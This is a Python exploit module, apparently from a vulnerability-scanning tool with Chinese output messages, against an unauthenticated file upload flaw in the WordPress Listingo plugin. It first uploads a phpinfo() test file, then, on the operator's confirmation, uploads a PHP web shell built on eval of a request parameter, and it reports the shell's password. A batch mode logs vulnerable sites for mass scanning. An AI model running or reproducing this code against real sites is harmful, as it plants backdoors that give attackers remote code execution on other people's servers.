#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from rich.prompt import Prompt
urllib3.disable_warnings()
class Wordpress_Listingo_File_Upload_Scan:
    def run(self,url):
        base_url = url + "/wp-admin/admin-ajax.php?action=listingo_temp_uploader"
        header = {
            "Host":url.split("://")[-1],
            "User-Agent": self.headers,
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Length": "805"
        }
        data = '''------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
Content-Type:text/php

<?php
phpinfo();
?>
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="submit"

Start Uploader
------WebKitFormBoundary8rVjnfcgxgKoytcg--'''
        try:
            response = requests.post(base_url,data=data,headers=header,verify=self.verify,proxies=self.proxy)
            if response.status_code == 200 and "wp-custom-uploader" in response.text:
                OutPrintInfoSuc("WordPress",f"存在wordpress listingo文件上传漏洞漏洞{base_url}")
                if not self.batch:
                    OutPrintInfo("WordPress",f"响应:\n{response.text.strip()}")
                else:
                    OutPutFile("wordpress_listingo_file_upload.txt",f"存在wordpress listingo文件上传漏洞漏洞 {base_url}")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", "目标请求出错")
            return False

    def run2(self, url):
        base_url = url + "/wp-admin/admin-ajax.php?action=listingo_temp_uploader"
        header = {
            "Host": url.split("://")[-1],
            "User-Agent": self.headers,
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Length": "805"
        }
        data = '''------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
Content-Type:text/php

<?php
@eval($_REQUEST[6])
?>
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="submit"

Start Uploader
------WebKitFormBoundary8rVjnfcgxgKoytcg--'''
        try:
            response = requests.post(base_url, data=data, headers=header, verify=self.verify, proxies=self.proxy)
            if response.status_code == 200 and "wp-custom-uploader" in response.text:
                OutPrintInfoSuc("WordPress", f"成功上传WebShell")
                OutPrintInfo("WordPress", f"密钥: [b red]6")
                OutPrintInfo("WordPress", f"响应:\n{response.text.strip()}")
        except Exception:
            OutPrintInfo("WordPress", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.headers = target["header"]
        self.verify = target["ssl"]
        proxy = target["proxy"]

        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("WordPress", "开始检测wordpress listingo 文件上传漏洞漏洞...")
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否上传WebShell([b red]y/n[/b red])")
                if choose == "y":
                    self.run2(url)
        if not self.batch:
            OutPrintInfo("WordPress", "wordpress listingo 文件上传漏洞漏洞检测结束")
